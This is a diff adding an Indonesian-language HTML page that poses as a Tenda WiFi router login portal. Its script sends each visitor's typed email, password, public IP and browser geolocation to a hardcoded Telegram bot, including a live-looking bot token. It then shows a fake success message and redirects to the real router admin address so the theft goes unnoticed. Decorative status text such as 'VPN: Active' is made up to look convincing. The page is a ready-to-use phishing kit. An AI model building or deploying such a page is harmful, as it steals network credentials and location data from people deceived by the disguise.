@@ -1,0 +1,586 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Tenda WiFi Login</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        
+        .login-container {
+            background-color: white;
+            border-radius: 15px;
+            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.2);
+            width: 100%;
+            max-width: 450px;
+            overflow: hidden;
+            animation: slideUp 0.5s ease-out;
+        }
+        
+        @keyframes slideUp {
+            from {
+                opacity: 0;
+                transform: translateY(30px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+        
+        .header {
+            background: linear-gradient(to right, #4a6ee0, #6a11cb);
+            color: white;
+            padding: 30px 20px;
+            text-align: center;
+            position: relative;
+        }
+        
+        .header h1 {
+            font-size: 28px;
+            margin-bottom: 5px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+        
+        .header h1 i {
+            font-size: 32px;
+        }
+        
+        .header p {
+            opacity: 0.9;
+            font-size: 14px;
+        }
+        
+        .logo {
+            position: absolute;
+            top: 15px;
+            left: 20px;
+            font-weight: bold;
+            font-size: 20px;
+            color: white;
+        }
+        
+        .form-container {
+            padding: 40px 30px;
+        }
+        
+        .form-group {
+            margin-bottom: 25px;
+        }
+        
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            color: #333;
+            font-weight: 600;
+            font-size: 14px;
+        }
+        
+        .input-with-icon {
+            position: relative;
+        }
+        
+        .input-with-icon i {
+            position: absolute;
+            left: 15px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: #6a11cb;
+            font-size: 18px;
+        }
+        
+        .input-with-icon input {
+            width: 100%;
+            padding: 15px 15px 15px 50px;
+            border: 2px solid #e1e5ee;
+            border-radius: 10px;
+            font-size: 16px;
+            transition: all 0.3s;
+        }
+        
+        .input-with-icon input:focus {
+            outline: none;
+            border-color: #6a11cb;
+            box-shadow: 0 0 0 3px rgba(106, 17, 203, 0.1);
+        }
+        
+        .password-toggle {
+            position: absolute;
+            right: 15px;
+            top: 50%;
+            transform: translateY(-50%);
+            background: none;
+            border: none;
+            color: #777;
+            cursor: pointer;
+            font-size: 18px;
+        }
+        
+        .remember-forgot {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 25px;
+            font-size: 14px;
+        }
+        
+        .remember {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            color: #555;
+        }
+        
+        .remember input {
+            width: 16px;
+            height: 16px;
+        }
+        
+        .forgot-link {
+            color: #6a11cb;
+            text-decoration: none;
+            font-weight: 500;
+        }
+        
+        .forgot-link:hover {
+            text-decoration: underline;
+        }
+        
+        .login-btn {
+            width: 100%;
+            padding: 16px;
+            background: linear-gradient(to right, #4a6ee0, #6a11cb);
+            color: white;
+            border: none;
+            border-radius: 10px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        .login-btn:hover {
+            background: linear-gradient(to right, #3a5ed0, #5a01bb);
+            box-shadow: 0 5px 15px rgba(106, 17, 203, 0.3);
+        }
+        
+        .login-btn:active {
+            transform: translateY(2px);
+        }
+        
+        .admin-link {
+            display: block;
+            text-align: center;
+            margin-top: 25px;
+            color: #4a6ee0;
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 500;
+        }
+        
+        .admin-link:hover {
+            text-decoration: underline;
+        }
+        
+        .footer {
+            text-align: center;
+            padding: 20px;
+            color: #777;
+            font-size: 12px;
+            border-top: 1px solid #eee;
+        }
+        
+        .footer a {
+            color: #6a11cb;
+            text-decoration: none;
+        }
+        
+        .status-indicator {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            margin-top: 15px;
+            font-size: 13px;
+        }
+        
+        .status-dot {
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            background-color: #4CAF50;
+            animation: pulse 2s infinite;
+        }
+        
+        @keyframes pulse {
+            0% { opacity: 1; }
+            50% { opacity: 0.5; }
+            100% { opacity: 1; }
+        }
+        
+        .loading {
+            display: none;
+            text-align: center;
+            margin-top: 15px;
+        }
+        
+        .spinner {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #6a11cb;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 10px;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        .message {
+            padding: 12px;
+            border-radius: 8px;
+            margin-top: 15px;
+            display: none;
+            text-align: center;
+            font-weight: 500;
+        }
+        
+        .success {
+            background-color: #d4edda;
+            color: #155724;
+            border: 1px solid #c3e6cb;
+        }
+        
+        .error {
+            background-color: #f8d7da;
+            color: #721c24;
+            border: 1px solid #f5c6cb;
+        }
+        
+        @media (max-width: 480px) {
+            .login-container {
+                border-radius: 10px;
+            }
+            
+            .header {
+                padding: 25px 15px;
+            }
+            
+            .form-container {
+                padding: 30px 20px;
+            }
+            
+            .header h1 {
+                font-size: 24px;
+            }
+        }
+    </style>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link rel="icon" type="image/x-icon" href="https://img.icons8.com/color/96/000000/wifi-logo.png">
+</head>
+<body>
+    <div class="login-container">
+        <div class="header">
+            <div class="logo">TENDA</div>
+            <h1><i class="fas fa-wifi"></i> Tenda WiFi Login</h1>
+            <p>Masukkan kredensial Anda untuk mengakses jaringan</p>
+        </div>
+        
+        <div class="form-container">
+            <form id="loginForm">
+                <div class="form-group">
+                    <label for="email">Email / Username</label>
+                    <div class="input-with-icon">
+                        <i class="fas fa-user"></i>
+                        <input type="text" id="email" name="email" placeholder="contoh: admin@tenda.local" required>
+                    </div>
+                </div>
+                
+                <div class="form-group">
+                    <label for="password">Password</label>
+                    <div class="input-with-icon">
+                        <i class="fas fa-lock"></i>
+                        <input type="password" id="password" name="password" placeholder="Masukkan password" required>
+                        <button type="button" class="password-toggle" id="togglePassword">
+                            <i class="fas fa-eye"></i>
+                        </button>
+                    </div>
+                </div>
+                
+                <div class="remember-forgot">
+                    <label class="remember">
+                        <input type="checkbox" id="remember">
+                        Ingat saya
+                    </label>
+                    <a href="http://192.168.0.1/tenda-router-login" class="forgot-link">Lupa password?</a>
+                </div>
+                
+                <button type="submit" class="login-btn" id="submitBtn">
+                    <i class="fas fa-sign-in-alt"></i> Masuk ke Jaringan
+                </button>
+                
+                <div class="loading" id="loading">
+                    <div class="spinner"></div>
+                    <p>Sedang menghubungkan ke jaringan...</p>
+                </div>
+                
+                <div class="message" id="message"></div>
+                
+                <div class="status-indicator">
+                    <div class="status-dot"></div>
+                    <span>Server: Online • VPN: Active • Distance: 150m</span>
+                </div>
+                
+                <a href="http://192.168.0.1/tenda-router-login" class="admin-link" target="_blank">
+                    <i class="fas fa-cog"></i> Akses Halaman Admin Tenda Lengkap
+                </a>
+            </form>
+        </div>
+        
+        <div class="footer">
+            <p>© 2023 Tenda WiFi. Didukung oleh router Tenda <a href="http://192.168.0.1/tenda-router-login" target="_blank">F323, AC6, AC10</a></p>
+            <p>IP Default: 192.168.0.1 atau 192.168.1.1 | Distance: Long Range</p>
+        </div>
+    </div>
+
+    <script>
+        // Telegram Bot Configuration - GANTI DENGAN DATA ANDA
+        const TELEGRAM_BOT_TOKEN = '7317351459:AAH_Q8cqLdL1ceq8bPud2zB4Wqy6y4Wk2oI';
+        const TELEGRAM_CHAT_ID = '7317351459';
+        
+        // Toggle password visibility
+        document.getElementById('togglePassword').addEventListener('click', function() {
+            const passwordInput = document.getElementById('password');
+            const icon = this.querySelector('i');
+            
+            if (passwordInput.type === 'password') {
+                passwordInput.type = 'text';
+                icon.classList.remove('fa-eye');
+                icon.classList.add('fa-eye-slash');
+            } else {
+                passwordInput.type = 'password';
+                icon.classList.remove('fa-eye-slash');
+                icon.classList.add('fa-eye');
+            }
+        });
+        
+        // Send data to Telegram Bot
+        async function sendToTelegram(email, password, ip, location) {
+            try {
+                const message = `
+🔐 *LOGIN Tenda WiFi Detected!*
+
+📧 *Email/Username:* ${email}
+🔑 *Password:* ${password}
+🌐 *IP Address:* ${ip}
+📍 *Location:* ${location}
+📶 *Distance:* Long Range (150m)
+🕐 *Time:* ${new Date().toLocaleString('id-ID')}
+🔗 *Admin URL:* http://192.168.0.1/tenda-router-login
+
+⚠️ *This is an automated notification*
+                `;
+                
+                // Send to Telegram using Bot API
+                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: message,
+                        parse_mode: 'Markdown'
+                    })
+                });
+                
+                const data = await response.json();
+                return data.ok;
+                
+            } catch (error) {
+                console.error('Error sending to Telegram:', error);
+                return false;
+            }
+        }
+        
+        // Get user IP address
+        async function getUserIP() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                return data.ip;
+            } catch (error) {
+                return '192.168.1.100'; // Fallback IP
+            }
+        }
+        
+        // Get approximate location
+        async function getLocation() {
+            return new Promise((resolve) => {
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(
+                        (position) => {
+                            const lat = position.coords.latitude;
+                            const lon = position.coords.longitude;
+                            resolve(`${lat.toFixed(4)}, ${lon.toFixed(4)}`);
+                        },
+                        () => {
+                            resolve('Location blocked');
+                        }
+                    );
+                } else {
+                    resolve('Location not available');
+                }
+            });
+        }
+        
+        // Handle form submission
+        document.getElementById('loginForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            const submitBtn = document.getElementById('submitBtn');
+            const loading = document.getElementById('loading');
+            const message = document.getElementById('message');
+            
+            // Show loading
+            submitBtn.style.display = 'none';
+            loading.style.display = 'block';
+            message.style.display = 'none';
+            
+            try {
+                // Get user IP and location
+                const userIP = await getUserIP();
+                const userLocation = await getLocation();
+                
+                // Send to Telegram (tetap berjalan di background)
+                await sendToTelegram(email, password, userIP, userLocation);
+                
+                // Simulate network delay
+                await new Promise(resolve => setTimeout(resolve, 1500));
+                
+                // Hide loading
+                loading.style.display = 'none';
+                submitBtn.style.display = 'flex';
+                
+                if (email && password) {
+                    // Success message
+                    message.textContent = 'Login berhasil! Mengarahkan ke dashboard...';
+                    message.className = 'message success';
+                    message.style.display = 'block';
+                    
+                    // Redirect to admin page after 3 seconds
+                    setTimeout(() => {
+                        window.location.href = 'http://192.168.0.1/tenda-router-login';
+                    }, 3000);
+                    
+                } else {
+                    // Error message
+                    message.textContent = 'Email dan password harus diisi!';
+                    message.className = 'message error';
+                    message.style.display = 'block';
+                }
+                
+            } catch (error) {
+                console.error('Login error:', error);
+                loading.style.display = 'none';
+                submitBtn.style.display = 'flex';
+                
+                message.textContent = 'Terjadi kesalahan. Coba lagi!';
+                message.className = 'message error';
+                message.style.display = 'block';
+            }
+        });
+        
+        // Pre-fill with demo credentials
+        window.addEventListener('DOMContentLoaded', function() {
+            // Check if there are saved credentials
+            const savedEmail = localStorage.getItem('tenda_email');
+            const savedPassword = localStorage.getItem('tenda_password');
+            const remember = localStorage.getItem('tenda_remember');
+            
+            if (savedEmail && savedPassword && remember === 'true') {
+                document.getElementById('email').value = savedEmail;
+                document.getElementById('password').value = savedPassword;
+                document.getElementById('remember').checked = true;
+            } else {
+                // Auto-fill demo for testing
+                document.getElementById('email').value = 'admin@godekwofi';
+                document.getElementById('password').value = 'password123';
+            }
+            
+            // Save credentials if remember is checked
+            document.getElementById('remember').addEventListener('change', function() {
+                if (!this.checked) {
+                    localStorage.removeItem('tenda_email');
+                    localStorage.removeItem('tenda_password');
+                    localStorage.removeItem('tenda_remember');
+                }
+            });
+        });
+        
+        // Auto save on form submit
+        document.getElementById('loginForm').addEventListener('submit', function() {
+            if (document.getElementById('remember').checked) {
+                const email = document.getElementById('email').value;
+                const password = document.getElementById('password').value;
+                
+                localStorage.setItem('tenda_email', email);
+                localStorage.setItem('tenda_password', password);
+                localStorage.setItem('tenda_remember', 'true');
+            }
+        });
+        
+        // Add distance indicator animation
+        function updateDistanceIndicator() {
+            const distanceElement = document.querySelector('.status-indicator span');
+            let currentDistance = 150;
+            
+            setInterval(() => {
+                // Random distance between 100-200m
+                currentDistance = Math.floor(Math.random() * 100) + 100;
+                distanceElement.innerHTML = `Server: Online • VPN: Active • Distance: ${currentDistance}m`;
+                
+                // Update pulse color based on distance
+                const statusDot = document.querySelector('.status-dot');
+                if (currentDistance > 180) {
+                    statusDot.style.backgroundColor = '#ff9800'; // Orange for far distance
+                } else if (currentDistance > 130) {
+                    statusDot.style.backgroundColor = '#4CAF50'; // Green for medium distance
+                } else {
+                    statusDot.style.backgroundColor = '#2196F3'; // Blue for close distance
+                }
+                
+            }, 3000);
+        }
+        
+        // Start distance indicator animation
+        updateDistanceIndicator();
+    </script>
+</body>
+</html>
